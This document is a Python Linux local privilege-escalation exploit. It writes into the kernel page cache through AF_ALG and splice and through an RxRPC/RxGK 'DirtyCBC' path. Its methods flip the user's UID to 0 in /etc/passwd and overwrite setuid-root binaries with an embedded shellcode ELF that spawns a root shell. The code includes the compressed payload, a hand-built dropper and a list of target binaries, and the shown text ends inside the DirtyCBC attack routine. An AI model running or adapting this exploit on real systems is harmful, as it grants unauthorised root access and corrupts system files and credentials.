#!/usr/bin/env python3

import ctypes
import ctypes.util
import errno
import fcntl
import os
import select
import shutil
import struct
import subprocess
import sys
import time
import zlib

try:
    import socket
except ImportError:
    socket = None
try:
    import pwd
except ImportError:
    pwd = None

# ──────────────────────────────────────────────────
# ANSI COLOR CODES
# ──────────────────────────────────────────────────
class Color:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    RED = "\033[0;31m"
    GREEN = "\033[0;32m"
    YELLOW = "\033[0;33m"
    BLUE = "\033[0;34m"
    MAGENTA = "\033[0;35m"
    CYAN = "\033[0;36m"
    WHITE = "\033[0;37m"
    BOLD_RED = "\033[1;31m"
    BOLD_GREEN = "\033[1;32m"
    BOLD_YELLOW = "\033[1;33m"
    BOLD_BLUE = "\033[1;34m"
    BOLD_MAGENTA = "\033[1;35m"
    BOLD_CYAN = "\033[1;36m"
    BOLD_WHITE = "\033[1;37m"

# ──────────────────────────────────────────────────
# CONSTANTS
# ──────────────────────────────────────────────────

AF_ALG = 38
SOL_ALG = 279
ALG_SET_KEY = 1
ALG_SET_IV = 2
ALG_SET_OP = 3
ALG_SET_AEAD_ASSOCLEN = 4
ALG_SET_AEAD_AUTHSIZE = 5
ALG_OP_DECRYPT = 0
MSG_MORE = 0x8000

AF_RXRPC = 33
SOL_RXRPC = 272
RXRPC_SECURITY_KEYRING = 2
RXRPC_USER_CALL_ID = 1
RXRPC_CHARGE_ACCEPT = 14
RXRPC_PACKET_TYPE_DATA = 1
RXRPC_PACKET_TYPE_ACK = 2
RXRPC_PACKET_TYPE_ABORT = 4
RXRPC_PACKET_TYPE_CHALLENGE = 6
RXRPC_PACKET_TYPE_RESPONSE = 7
RXRPC_CLIENT_INITIATED = 0x01
RXRPC_LAST_PACKET = 0x04

SYS_add_key = 248
SYS_keyctl = 250
KEY_SPEC_SESSION_KEYRING = -3
KEYCTL_JOIN_SESSION_KEYRING = 1
KEYCTL_SETPERM = 5
F_SETPIPE_SZ = 1031

RXGK_SERVER_ENC_TOKEN = 1036

PK_SUID = "/tmp/.s"
AUTHENC_KEY = bytes.fromhex('0800010000000010') + b'\x00' * 32

PAYLOAD_X86_64 = zlib.decompress(bytes.fromhex(
    "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d"
    "209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675"
    "c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
))

SUID_ORDER = [
    "/usr/bin/newgrp", "/usr/bin/chfn", "/usr/bin/chsh",
    "/usr/bin/gpasswd", "/usr/bin/wall", "/usr/bin/expiry",
    "/usr/bin/sg", "/usr/bin/at", "/usr/bin/crontab",
    "/usr/bin/mount", "/usr/bin/umount",
    "/usr/bin/fusermount3", "/usr/bin/fusermount",
    "/usr/bin/pkexec",
    "/usr/bin/passwd", "/usr/bin/su", "/bin/su", "/usr/bin/sudo",
]

ALGOS = [
    "authencesn(hmac(sha256),cbc(aes))",
    "authencesn(hmac(sha512),cbc(aes))",
    "authencesn(hmac(sha384),cbc(aes))",
    "authencesn(hmac(sha256),ctr(aes))",
    "authencesn(hmac(sha1),cbc(aes))",
    "authencesn(hmac(sha256),cbc(camellia))",
    "authencesn(hmac(sha256),rfc3686(ctr(aes)))",
]

# DirtyCBC RxGK parameters
_RXGK_SRV_PORT = 7000
_RXGK_SVC_ID = 1234
_RXGK_KVNO = 1
_RXGK_ENCTYPE = 18
_RXGK_KEY_LEN = 32
_RXGK_KR_NAME = b"rxgk_poc_kr"


def log(msg, end="\n"):
    s = str(msg)
    C = Color
    if s.startswith("[+]"):
        s = C.GREEN + s + C.RESET
    elif s.startswith("[-]"):
        s = C.RED + s + C.RESET
    elif s.startswith("[!]"):
        s = C.BOLD_YELLOW + s + C.RESET
    elif s.startswith("[*]"):
        s = C.CYAN + s + C.RESET
    elif s.startswith("[=== "):
        s = C.BOLD_MAGENTA + s + C.RESET
    sys.stderr.write(s + end)
    sys.stderr.flush()


def qrun(cmd, **kw):
    try:
        return subprocess.run(cmd, stdout=subprocess.DEVNULL,
                              stderr=subprocess.DEVNULL, **kw)
    except Exception:
        return None


# ──────────────────────────────────────────────────
# SPLICE ABSTRACTION (Python 3.6+ via ctypes)
# ──────────────────────────────────────────────────

_splice_fn = None
_splice_native = False


def init_splice():
    global _splice_fn, _splice_native
    if hasattr(os, 'splice'):
        _splice_fn = os.splice
        _splice_native = True
        return True
    try:
        libc = ctypes.CDLL(ctypes.util.find_library('c') or "libc.so.6",
                           use_errno=True)
        libc.splice.argtypes = [
            ctypes.c_int, ctypes.POINTER(ctypes.c_int64),
            ctypes.c_int, ctypes.POINTER(ctypes.c_int64),
            ctypes.c_size_t, ctypes.c_uint,
        ]
        libc.splice.restype = ctypes.c_ssize_t

        def _splice(fd_in, fd_out, count, offset_src=None, offset_dst=None):
            oi = ctypes.byref(ctypes.c_int64(offset_src)) if offset_src is not None else None
            oo = ctypes.byref(ctypes.c_int64(offset_dst)) if offset_dst is not None else None
            r = libc.splice(fd_in, oi, fd_out, oo, count, 0)
            if r < 0:
                e = ctypes.get_errno()
                raise OSError(e, os.strerror(e))
            return r

        _splice_fn = _splice
        _splice_native = False
        return True
    except Exception:
        return False


def do_splice(fd_in, fd_out, count, offset_src=None):
    if _splice_native:
        if offset_src is not None:
            return _splice_fn(fd_in, fd_out, count, offset_src=offset_src)
        return _splice_fn(fd_in, fd_out, count)
    return _splice_fn(fd_in, fd_out, count, offset_src=offset_src)


# ──────────────────────────────────────────────────
# AF_ALG CORE
# ──────────────────────────────────────────────────

_algo = None


def find_algo():
    global _algo
    if _algo:
        return _algo

    mods = [
        "af_alg", "algif_aead", "algif_skcipher",
        "authenc", "hmac",
        "sha256", "sha256_generic",
        "aes", "aes_generic", "aes_x86_64",
        "cbc", "ctr", "camellia",
    ]
    for m in mods:
        qrun(["modprobe", m], timeout=3)

    try:
        t = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
        t.close()
    except Exception:
        pass

    for trigger_algo in ["cbc(aes)", "hmac(sha256)"]:
        try:
            t = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
            t.bind(("skcipher", trigger_algo))
            t.close()
        except Exception:
            pass
        try:
            t = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
            t.bind(("hash", trigger_algo))
            t.close()
        except Exception:
            pass

    for a in ALGOS:
        try:
            s = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
            s.bind(("aead", a, 0, 0))
            s.close()
            _algo = a
            return a
        except (OSError, PermissionError):
            continue
    return None


def patch_4b(file_fd, offset, data_4b):
    ctrl = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
    ctrl.bind(("aead", _algo, 0, 0))
    ctrl.setsockopt(SOL_ALG, ALG_SET_KEY, AUTHENC_KEY)
    ctrl.setsockopt(SOL_ALG, ALG_SET_AEAD_AUTHSIZE, None, 4)
    op, _ = ctrl.accept()

    n = offset + 4
    op.sendmsg(
        [b'AAAA' + data_4b],
        [
            (SOL_ALG, ALG_SET_OP, struct.pack('I', ALG_OP_DECRYPT)),
            (SOL_ALG, ALG_SET_IV, struct.pack('I', 16) + b'\x00' * 16),
            (SOL_ALG, ALG_SET_AEAD_ASSOCLEN, struct.pack('I', 8)),
        ],
        MSG_MORE,
    )

    r, w = os.pipe()
    do_splice(file_fd, w, n, offset_src=0)
    do_splice(r, op.fileno(), n)

    try:
        op.recv(8 + offset)
    except Exception:pass

    os.close(r)
    os.close(w)
    op.close()
    ctrl.close()


# ──────────────────────────────────────────────────
# SUID DISCOVERY
# ──────────────────────────────────────────────────

def _is_suid_root_readable(path):
    try:
        if not os.path.isfile(path):
            return False
        st = os.stat(path)
        return (st.st_mode & 0o4000) and st.st_uid == 0 and os.access(path, os.R_OK)
    except (OSError, PermissionError):
        return False


def find_all_suid():
    found = set()
    ordered = []

    for p in SUID_ORDER:
        if _is_suid_root_readable(p) and p not in found:
            found.add(p)
            ordered.append(p)

    for dirs in [
        ["/usr/bin", "/bin", "/usr/sbin", "/sbin", "/usr/local/bin",
         "/usr/lib", "/usr/libexec"],
        ["/"],
    ]:
        try:
            cmd = ["find"] + dirs + ["-perm", "-4000", "-type", "f",
                   "-not", "-path", "*/proc/*", "-not", "-path", "*/sys/*"]
            r = subprocess.run(cmd, capture_output=True, text=True,
                               timeout=15 if "/" not in dirs else 30)
            for line in r.stdout.strip().split("\n"):
                p = line.strip()
                if p and p not in found and _is_suid_root_readable(p):
                    found.add(p)
                    ordered.append(p)
        except Exception:
            continue
        if ordered:
            break

    return ordered


# ──────────────────────────────────────────────────
# AUTO ROOT SHELL
# ──────────────────────────────────────────────────

def _reattach_tty():
    try:
        tty = os.open("/dev/tty", os.O_RDWR)
        os.dup2(tty, 0)
        os.dup2(tty, 1)
        os.dup2(tty, 2)
        os.close(tty)
    except OSError:
        pass


def auto_root_exec(binary):
    log("[+++] ROOT — dropping to shell")
    _reattach_tty()
    os.execl(binary, binary)


def auto_root_su(username):
    log("[+++] ROOT — su %s" % username)
    _reattach_tty()
    os.execlp("su", "su", username)


# ──────────────────────────────────────────────────
# METHOD 1: CopyFail /etc/passwd UID Flip
# ──────────────────────────────────────────────────

def try_passwd_flip():
    log("\n[=== METHOD 1: CopyFail /etc/passwd UID Flip ===]")

    if pwd is None:
        log("[-] pwd module unavailable")
        return False

    uid = os.getuid()
    if uid < 1000 or uid > 9999:
        log("[-] UID %d not 4-digit (need 1000-9999)" % uid)
        return False

    try:
        pw = pwd.getpwuid(uid)
    except KeyError:
        log("[-] UID %d not in passwd DB" % uid)
        return False

    if not os.access("/etc/passwd", os.R_OK):
        log("[-] /etc/passwd not readable")
        return False

    with open("/etc/passwd", "r") as f:
        content = f.read()

    search = "%s:" % pw.pw_name
    pos = content.find(search)
    if pos < 0:
        log("[-] %s not found in /etc/passwd" % pw.pw_name)
        return False

    after = pos + len(search)
    try:
        colon1 = content.index(":", after)
    except ValueError:
        log("[-] Malformed /etc/passwd line")
        return False
    uid_off = colon1 + 1

    expected = "%04d" % uid
    actual = content[uid_off:uid_off + 4]
    if actual != expected:
        log("[-] Sanity fail: expected '%s' at %d, got '%s'" % (expected, uid_off, actual))
        return False

    log("[+] %s uid=%d offset=%d" % (pw.pw_name, uid, uid_off))
    log("[*] Flipping UID -> 0000 in page cache...")

    fd = os.open("/etc/passwd", os.O_RDONLY)
    try:
        patch_4b(fd, uid_off, b"0000")
    except Exception as e:
        os.close(fd)
        log("[-] Patch failed: %s" % e)
        return False
    os.close(fd)

    with open("/etc/passwd", "r") as f:
        verify = f.read()[uid_off:uid_off + 4]

    if verify == "0000":
        log("[+++] UID flip VERIFIED in page cache!")
        # Chain to SUID binary mutation for passwordless root shell.
        # UID flip alone requires password via PAM; binary mutation
        # gives direct setuid(0)+execve("/bin/sh") without auth.
        root_via = _passwd_flip_get_shell(pw.pw_name)
        if not root_via:
            log("[*] Falling back to su (enter YOUR password for root shell)")
            auto_root_su(pw.pw_name)
        return True

    log("[-] Verify failed: got '%s' (expected '0000')" % verify)
    return False


def _passwd_flip_get_shell(username):
    """After UID flip to 0, get root shell without password."""
    arch = os.uname().machine
    if arch not in ("x86_64", "amd64"):
        return False

    payload = PAYLOAD_X86_64
    suids = find_all_suid()
    if not suids:
        return False

    log("[*] Chaining: patching SUID binary for passwordless shell...")
    for target in suids:
        try:
            fd = os.open(target, os.O_RDONLY)
        except (PermissionError, OSError):
            continue

        total = len(payload)
        try:
            for off in range(0, total, 4):
                chunk = payload[off:off + 4]
                if len(chunk) < 4:
                    chunk = chunk.ljust(4, b'\x00')
                patch_4b(fd, off, chunk)
            os.close(fd)
        except Exception:
            try:
                os.close(fd)
            except OSError:
                pass
            continue

        with open(target, "rb") as f:
            readback = f.read(total)

        verify_slice = slice(24, 32)
        if readback[verify_slice] == payload[verify_slice]:
            log("[+++] %s patched — exec for root shell" % target)
            auto_root_exec(target)
            return True

    return False


# ──────────────────────────────────────────────────
# METHOD 2: CopyFail Binary Mutation
# ──────────────────────────────────────────────────

def try_binary_mutation():
    log("\n[=== METHOD 2: CopyFail Binary Mutation ===]")

    arch = os.uname().machine
    if arch not in ("x86_64", "amd64"):
        log("[-] No payload for %s" % arch)
        return False

    payload = PAYLOAD_X86_64
    log("[*] Payload: %dB x86_64 ELF (setuid+execve /bin/sh)" % len(payload))

    suids = find_all_suid()
    if not suids:
        log("[-] No readable SUID-root binaries found")
        return False

    log("[+] %d SUID candidates" % len(suids))

    verify_slice = slice(24, 32)
    expected_verify = payload[verify_slice]

    for idx, target in enumerate(suids):
        log("\n  [%d/%d] %s" % (idx + 1, len(suids), target))

        try:
            fd = os.open(target, os.O_RDONLY)
        except (PermissionError, OSError) as e:
            log("    [-] open: %s" % e)
            continue

        total = len(payload)
        try:
            for off in range(0, total, 4):
                chunk = payload[off:off + 4]
                if len(chunk) < 4:
                    chunk = chunk.ljust(4, b'\x00')
                patch_4b(fd, off, chunk)
            os.close(fd)
        except OSError as e:
            try:
                os.close(fd)
            except OSError:
                pass
            log("    [-] patch error: %s" % e)
            if e.errno == 22:
                log("    [-] EINVAL — seccomp/AppArmor may be blocking AF_ALG")
            continue
        except Exception as e:
            try:
                os.close(fd)
            except OSError:
                pass
            log("    [-] %s: %s" % (type(e).__name__, e))
            continue

        with open(target, "rb") as f:
            readback = f.read(total)

        if readback[verify_slice] == expected_verify:
            log("    [+++] Page cache VERIFIED — %s is our payload now" % target)
            auto_root_exec(target)
            return True
        else:
            log("    [-] Verify mismatch")
            continue

    log("\n[-] Exhausted all %d SUID binaries" % len(suids))
    return False


# ──────────────────────────────────────────────────
# DIRTYCBC: libcrypto + RFC 3961 + RxGK attack
# ──────────────────────────────────────────────────

_crypto = None
_libc_cbc = None
_rxgk_Ke = None
_rxgk_secret = None


def _load_libcrypto():
    global _crypto
    for cand in ("libcrypto.so.3", "libcrypto.so.1.1", "libcrypto.so"):
        try:
            _crypto = ctypes.CDLL(cand, use_errno=True)
            _crypto.EVP_CIPHER_CTX_new.restype = ctypes.c_void_p
            _crypto.EVP_CIPHER_CTX_new.argtypes = []
            _crypto.EVP_CIPHER_CTX_free.restype = None
            _crypto.EVP_CIPHER_CTX_free.argtypes = [ctypes.c_void_p]
            _crypto.EVP_aes_256_ecb.restype = ctypes.c_void_p
            _crypto.EVP_aes_256_ecb.argtypes = []
            _crypto.EVP_EncryptInit_ex.restype = ctypes.c_int
            _crypto.EVP_EncryptInit_ex.argtypes = [ctypes.c_void_p, ctypes.c_void_p,
                                                    ctypes.c_void_p, ctypes.c_char_p, ctypes.c_void_p]
            _crypto.EVP_DecryptInit_ex.restype = ctypes.c_int
            _crypto.EVP_DecryptInit_ex.argtypes = [ctypes.c_void_p, ctypes.c_void_p,
                                                    ctypes.c_void_p, ctypes.c_char_p, ctypes.c_void_p]
            _crypto.EVP_CIPHER_CTX_set_padding.restype = ctypes.c_int
            _crypto.EVP_CIPHER_CTX_set_padding.argtypes = [ctypes.c_void_p, ctypes.c_int]
            _crypto.EVP_EncryptUpdate.restype = ctypes.c_int
            _crypto.EVP_EncryptUpdate.argtypes = [ctypes.c_void_p, ctypes.c_char_p,
                                                   ctypes.POINTER(ctypes.c_int),
                                                   ctypes.c_char_p, ctypes.c_int]
            _crypto.EVP_DecryptUpdate.restype = ctypes.c_int
            _crypto.EVP_DecryptUpdate.argtypes = [ctypes.c_void_p, ctypes.c_char_p,
                                                   ctypes.POINTER(ctypes.c_int),
                                                   ctypes.c_char_p, ctypes.c_int]
            return True
        except OSError:
            continue
    return False


def _load_libc_cbc():
    global _libc_cbc
    _libc_cbc = ctypes.CDLL("libc.so.6", use_errno=True)
    _libc_cbc.syscall.restype = ctypes.c_long
    _libc_cbc.bind.restype = ctypes.c_int
    _libc_cbc.bind.argtypes = [ctypes.c_int, ctypes.c_char_p, ctypes.c_uint]
    _libc_cbc.vmsplice.restype = ctypes.c_long
    _libc_cbc.vmsplice.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_ulong, ctypes.c_uint]
    _libc_cbc.splice.restype = ctypes.c_long
    _libc_cbc.splice.argtypes = [ctypes.c_int, ctypes.POINTER(ctypes.c_longlong),
                                  ctypes.c_int, ctypes.POINTER(ctypes.c_longlong),
                                  ctypes.c_size_t, ctypes.c_uint]
    return True


def _aes256_ecb(do_encrypt, key, in_block):
    assert len(key) == 32 and len(in_block) == 16
    ctx = _crypto.EVP_CIPHER_CTX_new()
    if not ctx:
        return None
    try:
        cipher = _crypto.EVP_aes_256_ecb()
        if do_encrypt:
            _crypto.EVP_EncryptInit_ex(ctx, cipher, None, key, None)
        else:
            _crypto.EVP_DecryptInit_ex(ctx, cipher, None, key, None)
        _crypto.EVP_CIPHER_CTX_set_padding(ctx, 0)
        out = ctypes.create_string_buffer(16)
        outlen = ctypes.c_int(0)
        if do_encrypt:
            _crypto.EVP_EncryptUpdate(ctx, out, ctypes.byref(outlen), in_block, 16)
        else:
            _crypto.EVP_DecryptUpdate(ctx, out, ctypes.byref(outlen), in_block, 16)
        return out.raw[:16]
    finally:
        _crypto.EVP_CIPHER_CTX_free(ctx)


def _gcd(a, b):
    while b:
        a, b = b, a % b
    return a


def _lcm(a, b):
    return a // _gcd(a, b) * b


def _nfold(buf, outlen):
    inlen = len(buf)
    ulcm = _lcm(inlen, outlen)
    out = bytearray(outlen)
    byte = 0
    for i in range(ulcm - 1, -1, -1):
        msbit = (((inlen * 8) - 1)
                 + (((inlen * 8) + 13) * (i // inlen))
                 + ((inlen - (i % inlen)) * 8)) % (inlen * 8)
        byte += (((buf[((inlen - 1) - (msbit >> 3)) % inlen] << 8)
                  | buf[(inlen - (msbit >> 3)) % inlen])
                 >> ((msbit & 7) + 1)) & 0xff
        byte += out[i % outlen]
        out[i % outlen] = byte & 0xff
        byte >>= 8
    if byte:
        for i in range(outlen - 1, -1, -1):
            byte += out[i]
            out[i] = byte & 0xff
            byte >>= 8
    return bytes(out)


def _dk_aes256(K, constant):
    inblock = constant if len(constant) == 16 else _nfold(constant, 16)
    k1 = _aes256_ecb(True, K, inblock)
    k2 = _aes256_ecb(True, K, k1)
    return k1 + k2


def _compute_Ke(K):
    constant = bytes([0, 0, (RXGK_SERVER_ENC_TOKEN >> 8) & 0xff,
                      RXGK_SERVER_ENC_TOKEN & 0xff, 0xAA])
    return _dk_aes256(K, constant)


class _Iovec(ctypes.Structure):
    _fields_ = [("iov_base", ctypes.c_void_p), ("iov_len", ctypes.c_size_t)]


def _vmsplice_bufs(pipe_w_fd, buffers):
    n = len(buffers)
    arr = (_Iovec * n)()
    refs = []
    for i, buf in enumerate(buffers):
        cbuf = ctypes.c_char * len(buf)
        if isinstance(buf, bytes):
            backing = cbuf.from_buffer_copy(buf)
        else:
            backing = cbuf.from_buffer(buf)
        refs.append(backing)
        arr[i].iov_base = ctypes.addressof(backing)
        arr[i].iov_len = len(buf)
    ret = _libc_cbc.vmsplice(pipe_w_fd, ctypes.byref(arr), n, 0)
    if ret < 0:
        raise OSError(ctypes.get_errno(), "vmsplice")
    return ret


def _splice_file(in_fd, in_off, out_fd, length):
    off = ctypes.c_longlong(in_off)
    ret = _libc_cbc.splice(in_fd, ctypes.byref(off), out_fd, None, length, 0)
    if ret < 0:
        raise OSError(ctypes.get_errno(), "splice_file")
    return ret


def _splice_drain(in_fd, out_fd, length):
    ret = _libc_cbc.splice(in_fd, None, out_fd, None, length, 0)
    if ret < 0:
        raise OSError(ctypes.get_errno(), "splice_drain")
    return ret


def _key_add(ktype, desc, payload, ringid):
    plen = 0 if payload is None else len(payload)
    pbuf = payload if payload is not None else b""
    n = _libc_cbc.syscall(ctypes.c_long(SYS_add_key),
                           ctypes.c_char_p(ktype),
                           ctypes.c_char_p(desc),
                           ctypes.c_char_p(pbuf),
                           ctypes.c_size_t(plen),
                           ctypes.c_int(ringid))
    if n < 0:
        raise OSError(ctypes.get_errno(), "add_key")
    return n


def _keyctl(op, *args):
    fixed = []
    for a in args:
        if a is None:
            fixed.append(ctypes.c_void_p(0))
        elif isinstance(a, int):
            fixed.append(ctypes.c_ulong(a))
        else:
            fixed.append(a)
    return _libc_cbc.syscall(ctypes.c_long(SYS_keyctl), ctypes.c_ulong(op), *fixed)


def _pack_rxrpc_hdr(epoch, cid, callN, seq, serial, type_, flags, sec_idx, svc_id):
    return struct.pack("!IIIII BBBB HH",
                        epoch, cid, callN, seq, serial,
                        type_, flags, 0, sec_idx, 0, svc_id)


def _xor_bytes(a, b):
    return bytes(x ^ y for x, y in zip(a, b))


# 192-byte ELF dropper: setuid(0) + execve("/bin/sh")
def _build_tiny_elf():
    e_hdr = b"".join([
        b"\x7fELF\x02\x01\x01\x00", b"\x00" * 8,
        struct.pack("<H", 2), struct.pack("<H", 0x3e),
        struct.pack("<I", 1), struct.pack("<Q", 0x10000078),
        struct.pack("<Q", 64), struct.pack("<Q", 0),
        struct.pack("<I", 0), struct.pack("<H", 64),
        struct.pack("<H", 56), struct.pack("<H", 1),
        struct.pack("<H", 0), struct.pack("<H", 0), struct.pack("<H", 0),
    ])
    phe = b"".join([
        struct.pack("<I", 1), struct.pack("<I", 5),
        struct.pack("<Q", 0), struct.pack("<Q", 0x10000000),
        struct.pack("<Q", 0x10000000), struct.pack("<Q", 192),
        struct.pack("<Q", 192), struct.pack("<Q", 0x1000),
    ])
    sc = bytes.fromhex(
        "31ff" "b069" "0f05"
        "48b8" "2f62696e2f736800"
        "50" "4889e7" "31f6" "31d2" "31c0" "b03b" "0f05"
    )
    pad = b"\xcc" * (192 - len(e_hdr) - len(phe) - len(sc))
    return e_hdr + phe + sc + pad


_DIRTYCBC_ELF = _build_tiny_elf()


def _dirtycbc_init():
    """Initialize DirtyCBC: libcrypto + libc + RxGK key derivation."""
    global _rxgk_secret, _rxgk_Ke
    if not _load_libcrypto():
        return False
    _load_libc_cbc()
    _rxgk_secret = os.urandom(_RXGK_KEY_LEN)
    _rxgk_Ke = _compute_Ke(_rxgk_secret)
    if _rxgk_Ke is None:
        return False
    return True


def _trigger_rxrpc_key_type():
    """Force-load the rxrpc_s key type via every known trigger."""
    # Direct module loads
    for mod in ["af_rxrpc", "rxrpc", "rxgk", "rxkad",
                "key-type-rxrpc_s", "net-pf-33"]:
        qrun(["modprobe", mod], timeout=3)

    # Socket creation triggers net-pf-33 → af_rxrpc which registers rxrpc_s
    for _ in range(2):
        try:
            s = socket.socket(AF_RXRPC, socket.SOCK_DGRAM, socket.AF_INET)
            s.close()
        except OSError:
            pass

    # Bind attempt triggers security class registration
    try:
        s = socket.socket(AF_RXRPC, socket.SOCK_DGRAM, socket.AF_INET)
        sin = struct.pack("=H H 4s 8s", socket.AF_INET,
                           socket.htons(17999), socket.inet_aton("127.0.0.1"),
                           b"\x00" * 8)
        srx = struct.pack("=H H H H", AF_RXRPC, 0,
                           socket.SOCK_DGRAM, len(sin)) + sin
        _libc_cbc.bind(s.fileno(), srx, len(srx))
        s.close()
    except OSError:
        pass

    # request_key trigger — kernel calls request_module("key-type-rxrpc_s")
    try:
        _libc_cbc.syscall(ctypes.c_long(SYS_keyctl),
                           ctypes.c_ulong(23),  # KEYCTL_CAPABILITIES (harmless probe)
                           ctypes.c_void_p(0), ctypes.c_size_t(0))
    except Exception:
        pass

    time.sleep(0.3)


def _test_rxrpc_key_type():
    """Check if rxrpc_s key type is available without side effects."""
    # Check /proc/keys key types
    try:
        with open("/proc/keys", "r") as f:
            pass  # readable = key subsystem works
    except (OSError, PermissionError):
        pass

    # Try a dummy add_key to test the key type — use invalid ring so it
    # fails fast but still triggers the module load
    try:
        _libc_cbc.syscall(ctypes.c_long(SYS_add_key),
                           ctypes.c_char_p(b"rxrpc_s"),
                           ctypes.c_char_p(b"0:2:1:17"),
                           ctypes.c_char_p(b"\x00" * 8),
                           ctypes.c_size_t(8),
                           ctypes.c_int(-4))  # KEY_SPEC_REQKEY_AUTH_KEY = invalid
    except Exception:
        pass


def _dirtycbc_setup_keyring():
    """Set up AF_RXRPC keyring with our controlled server key."""
    rc = _keyctl(KEYCTL_JOIN_SESSION_KEYRING, None)
    if rc < 0:
        # Fallback: join with a named keyring
        _libc_cbc.syscall(ctypes.c_long(SYS_keyctl),
                           ctypes.c_ulong(KEYCTL_JOIN_SESSION_KEYRING),
                           ctypes.c_char_p(b"rxgk_session"))

    kr = _key_add(b"keyring", _RXGK_KR_NAME, None, KEY_SPEC_SESSION_KEYRING)

    # Try security index 6 (RxGK) first, fall back to 2 (rxkad)
    last_err = None
    for sec_idx, key_fmt in [
        (6, "%d:6:%d:%d"),   # RxGK: svc:6:kvno:enctype
        (2, "%d:2:%d"),      # rxkad: svc:2:kvno
    ]:
        desc = (key_fmt % ((_RXGK_SVC_ID, _RXGK_KVNO, _RXGK_ENCTYPE)
                if sec_idx == 6 else (_RXGK_SVC_ID, _RXGK_KVNO))).encode()

        # Build proper key payload based on security class
        if sec_idx == 6:
            # RxGK: raw key bytes
            payload = _rxgk_secret
        else:
            # rxkad: struct rxrpc_key_data_v1 { u16 security_index; u16 ticket_length;
            #         u32 expiry; u8 kvno; u8 session_key[8]; u8 ticket[] }
            payload = struct.pack("=HHI", sec_idx, 0, 0xFFFFFFFF)
            payload += struct.pack("B", _RXGK_KVNO)
            payload += _rxgk_secret[:8]

        try:
            k = _key_add(b"rxrpc_s", desc, payload, kr)
            _keyctl(KEYCTL_SETPERM, kr, 0x3f3f3f3f)
            _keyctl(KEYCTL_SETPERM, k, 0x3f3f3f3f)
            log("[+] rxrpc_s key added (sec_idx=%d, key_id=%d)" % (sec_idx, k))
            return kr, sec_idx
        except OSError as e:
            last_err = e
            continue

    raise last_err


def _dirtycbc_open_server():
    """Open AF_RXRPC server socket."""
    s = socket.socket(AF_RXRPC, socket.SOCK_DGRAM, socket.AF_INET)
    s.setsockopt(SOL_RXRPC, RXRPC_SECURITY_KEYRING, _RXGK_KR_NAME)
    sin = struct.pack("=H H 4s 8s",
                       socket.AF_INET,
                       socket.htons(_RXGK_SRV_PORT),
                       socket.inet_aton("127.0.0.1"),
                       b"\x00" * 8)
    srx = struct.pack("=H H H H", AF_RXRPC, _RXGK_SVC_ID,
                       socket.SOCK_DGRAM, len(sin)) + sin
    rc = _libc_cbc.bind(s.fileno(), srx, len(srx))
    if rc != 0:
        raise OSError(ctypes.get_errno(), "rxrpc bind")
    s.listen(8)
    return s


def _dirtycbc_charge(srv, n):
    for i in range(n):
        uid = 0x1000 + i
        ancdata = [
            (SOL_RXRPC, RXRPC_USER_CALL_ID, struct.pack("=Q", uid)),
            (SOL_RXRPC, RXRPC_CHARGE_ACCEPT, b""),
        ]
        srv.sendmsg([], ancdata, 0)


def _dirtycbc_attack_batch(target_path, chosen_bytes, target_off, sec_idx=6):
    """One batch of the chosen-plaintext attack."""
    chosen_len = len(chosen_bytes)
    nblocks = chosen_len // 16

    tfd = os.open(target_path, os.O_RDONLY)
    target_blocks = os.pread(tfd, chosen_len, target_off)
    if len(target_blocks) != chosen_len:
        os.close(tfd)
        return False

    user_bufs = bytearray(16 * nblocks)
    for i in range(nblocks):
        target_i = target_blocks[16 * i: 16 * (i + 1)]
        chosen_i = chosen_bytes[16 * i: 16 * (i + 1)]
        if i < nblocks - 1:
            dec = _aes256_ecb(False, _rxgk_Ke, target_i)
            user_bufs[16 * i:16 * (i + 1)] = _xor_bytes(dec, chosen_i)
        else:
            xor_in = _xor_bytes(chosen_i, target_i)
            user_bufs[16 * i:16 * (i + 1)] = _aes256_ecb(True, _rxgk_Ke, xor_in)

    udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
    udp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    udp.bind(("127.0.0.1", 0))

    try:
        epoch = 0xDEADBEEF
        cid = 0x10000000 + ((target_off & 0xFFFFFFF) << 4)
        hdr = _pack_rxrpc_hdr(epoch, cid, 1, 1, 1,
                               RXRPC_PACKET_TYPE_DATA,
                               RXRPC_CLIENT_INITIATED | RXRPC_LAST_PACKET,
                               sec_idx, _RXGK_SVC_ID)
        udp.sendto(hdr + b"\xaa" * 16, ("127.0.0.1", _RXGK_SRV_PORT))

        ch_pkt = None
        src = None
        for _ in range(8):
            ready, _, _ = select.select([udp], [], [], 2.0)
            if not ready:
                break
            data, src = udp.recvfrom(2048)
            if len(data) >= 28:
                t = data[20] if isinstance(data[20], int) else ord(data[20])
                if t == RXRPC_PACKET_TYPE_CHALLENGE:
                    ch_pkt = data
                    break

        if ch_pkt is None:
            os.close(tfd)
            return False

        ch_epoch, ch_cid = struct.unpack_from("!II", ch_pkt, 0)
        ticket_len = 32 * nblocks + 12
        token_len = 12 + ticket_len

        rmal = _pack_rxrpc_hdr(ch_epoch, ch_cid, 0, 0, 2,
                                RXRPC_PACKET_TYPE_RESPONSE,RXRPC_CLIENT_INITIATED, sec_idx, _RXGK_SVC_ID)
        hdr_pre = struct.pack("!Q I I I I", 0, token_len,
                               _RXGK_KVNO, _RXGK_ENCTYPE, ticket_len)
        hmac_zone = b"\x00" * 12
        hdr_post = struct.pack("!I", 56) + b"\xcc" * 56

        udp.connect(src)

        rfd, wfd = os.pipe()
        try:
            fcntl.fcntl(wfd, F_SETPIPE_SZ, 1 << 20)
            _vmsplice_bufs(wfd, [rmal + hdr_pre])
            for i in range(nblocks):
                _vmsplice_bufs(wfd, [bytes(user_bufs[16 * i:16 * (i + 1)])])
                _splice_file(tfd, target_off + 16 * i, wfd, 16)
            _vmsplice_bufs(wfd, [hmac_zone + hdr_post])
            total = len(rmal) + len(hdr_pre) + 32 * nblocks + 12 + len(hdr_post)
            _splice_drain(rfd, udp.fileno(), total)
        finally:
            os.close(rfd)
            os.close(wfd)

        time.sleep(0.15)
    finally:
        udp.close()
